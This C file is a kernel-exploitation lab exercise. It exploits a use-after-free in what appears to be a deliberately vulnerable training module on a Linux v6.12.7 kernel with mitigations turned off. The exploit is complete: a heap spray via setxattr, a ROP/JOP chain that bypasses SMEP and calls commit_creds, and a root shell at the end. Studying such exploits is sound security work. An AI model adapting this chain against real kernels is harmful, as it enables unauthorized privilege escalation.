/*
 * Funny experiments with Linux kernel exploitation:
 * a basic use-after-free exploit invoking a callback in the freed `drill_item_t` struct.
 *
 * Only basic methods. Just for fun.
 *
 * 1) Compile the Linux kernel without:
 *   - CONFIG_SLAB_BUCKETS
 *   - CONFIG_RANDOM_KMALLOC_CACHES
 *
 * 2) Disable mitigations:
 *   - run qemu with "-cpu qemu64,+smep,-smap".
 *   - run the kernel with "pti=off nokaslr".
 *
 * 3) Check your kernel version:
 *   - head at v6.12.7 tag,
 *   319addc2ad901dac4d6cc931d77ef35073e0942f
 *
 * 4) Difference from `defconfig`:
 *   - CONFIG_CONFIGFS_FS=y
 *   - CONFIG_SECURITYFS=y
 *   - CONFIG_DEBUG_INFO=y
 *   - CONFIG_DEBUG_INFO_DWARF4=y
 *   - CONFIG_DEBUG_INFO_COMPRESSED_NONE=y
 *   - CONFIG_GDB_SCRIPTS=y
 *
 *  5) Compiler is gcc, version 11.4.0
 *
 * This PoC performs control flow hijack and gains LPE bypassing SMEP using ROP/JOP.
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <assert.h>
#include <sched.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/xattr.h>
#include <sys/user.h>
#include "drill.h"

/* clang-format off */
#define FAKE_STACK_ADDR			0xf6000000UL /* STACKPIVOT_GADGET_PTR changes rsp to this value */
#define FAKE_STACK_MMAP_ADDR		(FAKE_STACK_ADDR - PAGE_SIZE)
#define MMAP_SZ				(PAGE_SIZE * 2)
#define PAYLOAD_SZ			95

/* ============================== Kernel stuff ============================== */

/* Addresses from System.map (no KASLR) */
#define COMMIT_CREDS_PTR		0xffffffff810c0960UL
#define PREPARE_KERNEL_CRED_PTR		0xffffffff810c0bf0UL
#define INIT_TASK_PTR			0xffffffff82a0c940UL

/* ROP gadgets */
#define STACKPIVOT_GADGET_PTR		0xffffffff81c1349bUL /* mov esp, 0xf6000000 ; ret */
#define POP_RDI				0xffffffff81316d2fUL /* pop rdi ; ret */
#define POP_RAX				0xffffffff810604c4UL /* pop rax ; ret */
#define JMP_RAX				0xffffffff810372abUL /* jmp rax */
#define PUSH_RAX_POP_RSI		0xffffffff81d1da58UL /* push rax ; pop rsi ; ret */
#define PUSH_RSI_POP_RDI_JMP		0xffffffff810f1a26UL /* push rsi ; pop rdi ; add eax, dword ptr [rax] ; jmp 0xffffffff810f19de */
							     /* where 0xffffffff810f19de contains: add rsp,0x8; ret */
#define XCHG_RAX_RBP			0xffffffff81633c34UL /* xchg rax, rbp ; ret */
#define SUB_RAX_RDI			0xffffffff81f2ec90UL /* sub rax, rdi ; ret */
#define PUSH_RAX_POP_RSP_DEC_PTR_RAX	0xffffffff81d186f5UL /* push rax ; pop rsp ; dec DWORD PTR [rax-0x7d] ; ret */
/* clang-format on */

/* ========================================================================== */

int prepare_rop_chain(void)
{
	char *mmaped_area = NULL;
	unsigned long *fake_stack = NULL;
	unsigned long offset = 0;

	mmaped_area = mmap((void *)FAKE_STACK_MMAP_ADDR, MMAP_SZ, PROT_WRITE,
			   MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
	if (mmaped_area == MAP_FAILED) {
		perror("[-] mmap");
		return EXIT_FAILURE;
	}
	if (mmaped_area != (void *)FAKE_STACK_MMAP_ADDR) {
		printf("[-] mmaped to wrong addr: %p\n", mmaped_area);
		return EXIT_FAILURE;
	}
	printf("[+] mmaped_area is at %p\n", mmaped_area);
	memset(mmaped_area, 0, MMAP_SZ);

	fake_stack = (unsigned long *)(mmaped_area + PAGE_SIZE);
	printf("[+] fake stack for the ROP chain is at %p\n", fake_stack);

	/* clang-format off */
	fake_stack[offset++] = POP_RDI;
	fake_stack[offset++] = INIT_TASK_PTR; /* use it as the 1st argument of prepare_kernel_cred() */
	fake_stack[offset++] = POP_RAX;
	fake_stack[offset++] = PREPARE_KERNEL_CRED_PTR;
	fake_stack[offset++] = JMP_RAX; /* execute prepare_kernel_cred(&init_task) */
	fake_stack[offset++] = PUSH_RAX_POP_RSI; /* rax contains the result of prepare_kernel_cred() */
	fake_stack[offset++] = PUSH_RSI_POP_RDI_JMP; /* put it in rdi as the 1st argument of the function */
	fake_stack[offset++] = 0xdeadfeed; /* a dummy value for the gadget we jumped to */
	fake_stack[offset++] = POP_RAX;
	fake_stack[offset++] = COMMIT_CREDS_PTR;
	fake_stack[offset++] = JMP_RAX; /* execute commit_creds(prepare_kernel_cred(&init_task)) */
	fake_stack[offset++] = XCHG_RAX_RBP; /* calculate the original rsp value using rbp */
	fake_stack[offset++] = POP_RDI;
	fake_stack[offset++] = 0x37;
	fake_stack[offset++] = SUB_RAX_RDI; /* the original rsp value is the rbp value minus 0x37 */
	fake_stack[offset++] = PUSH_RAX_POP_RSP_DEC_PTR_RAX; /* restore rsp and continue */
	/* clang-format on */

	return EXIT_SUCCESS;
}

int do_cpu_pinning(void)
{
	int ret = 0;
	cpu_set_t single_cpu;

	CPU_ZERO(&single_cpu);
	CPU_SET(0, &single_cpu);

	ret = sched_setaffinity(0, sizeof(single_cpu), &single_cpu);
	if (ret != 0) {
		perror("[-] sched_setaffinity");
		return EXIT_FAILURE;
	}

	printf("[+] pinned to CPU #0\n");
	return EXIT_SUCCESS;
}

void run_sh(void)
{
	pid_t pid = -1;
	char *args[] = { "/bin/sh", "-i", NULL };
	int status = 0;

	pid = fork();

	if (pid < 0) {
		perror("[-] fork");
		return;
	}

	if (pid == 0) {
		execve("/bin/sh", args, NULL); /* Should not return */
		perror("[-] execve");
	} else {
		if (wait(&status) < 0)
			perror("[-] wait");

		printf("[+] /bin/sh finished\n");
	}
}

void init_payload(char *p, size_t size)
{
	struct drill_item_t *item = (struct drill_item_t *)p;

	memset(p, 0x41, size);

	item->callback = (void (*)(void))STACKPIVOT_GADGET_PTR;

	printf("[+] payload:\n");
	printf("\tstart at %p\n", p);
	printf("\tcallback at %p\n", &item->callback);
	printf("\tcallback 0x%lx\n", (unsigned long)item->callback);
}

int act(int act_fd, int code, int n, char *args)
{
	char buf[DRILL_ACT_SIZE] = { 0 };
	size_t len = 0;
	ssize_t bytes = 0;

	if (args)
		snprintf(buf, DRILL_ACT_SIZE, "%d %d %s", code, n, args);
	else
		snprintf(buf, DRILL_ACT_SIZE, "%d %d", code, n);

	len = strlen(buf) + 1; /* with null byte */
	assert(len <= DRILL_ACT_SIZE);

	bytes = write(act_fd, buf, len);
	if (bytes <= 0) {
		perror("[-] write");
		return EXIT_FAILURE;
	}
	if (bytes != len) {
		printf("[-] wrote only %zd bytes to drill_act\n", bytes);
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}

int main(void)
{
	int result = EXIT_FAILURE;
	char *spray_data = NULL;
	int ret = EXIT_FAILURE;
	int act_fd = -1;
	int spray_fd = -1;

	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());

	/*
	 * Prepare
	 */
	if (prepare_rop_chain() == EXIT_FAILURE) {
		printf("[-] ROP preparing failed\n");
		goto end;
	}

	spray_data = mmap(NULL, MMAP_SZ, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (spray_data == MAP_FAILED) {
		perror("[-] mmap");
		goto end;
	}

	init_payload(spray_data, MMAP_SZ);

	act_fd = open("/proc/drill_act", O_WRONLY);
	if (act_fd < 0) {
		perror("[-] open drill_act");
		goto end;
	}
	printf("[+] drill_act is opened\n");

	if (do_cpu_pinning() == EXIT_FAILURE)
		goto end;

	spray_fd = open("./foobar", O_CREAT, S_IRUSR | S_IWUSR);
	if (spray_fd < 0) {
		perror("[-] open failed");
		goto end;
	}

	printf("[+] spray_fd is opened\n");

	if (act(act_fd, DRILL_ACT_ALLOC, 3, NULL) == EXIT_FAILURE)
		goto end;
	printf("[+] DRILL_ACT_ALLOC\n");

	if (act(act_fd, DRILL_ACT_CALLBACK, 3, NULL) == EXIT_FAILURE)
		goto end;
	printf("[+] DRILL_ACT_CALLBACK\n");

	/*
	 * Exploit
	 */

	if (act(act_fd, DRILL_ACT_FREE, 3, NULL) == EXIT_FAILURE)
		goto end;
	printf("[+] DRILL_ACT_FREE\n");

	ret = setxattr("./", "foobar", spray_data, PAYLOAD_SZ, 0);
	printf("[+] setxattr is called (returned %d)\n", ret);

	/*
	 * During a control flow hijack, the kernel often crashes with a double fault error.
	 * This happens when the time slice ends and the exploit process is preempted by another process.
	 * Let's call sched_yield() to make control flow hijacking more stable.
	 * This function frees up the current CPU for other tasks, causing the ROP chain to
	 * execute from the new scheduler time slice.
	 */
	if (sched_yield() < 0) {
		perror("[-] sched_yield");
		goto end;
	}

	if (act(act_fd, DRILL_ACT_CALLBACK, 3, NULL) == EXIT_FAILURE)
		goto end;
	printf("[+] DRILL_ACT_CALLBACK\n");

	if (getuid() == 0 && geteuid() == 0) {
		printf("[+] finish as: uid=0, euid=0, start sh...\n");
		result = EXIT_SUCCESS;
		run_sh();
	} else {
		printf("[-] heap spraying\n");
	}

end:
	if (spray_fd >= 0) {
		ret = close(spray_fd);
		if (ret != 0)
			perror("[-] close spray_fd");
	}

	if (act_fd >= 0) {
		ret = close(act_fd);
		if (ret != 0)
			perror("[-] close act_fd");
	}

	if (remove("./foobar") != 0)
		perror("[-] remove ./foobar");

	return result;
}
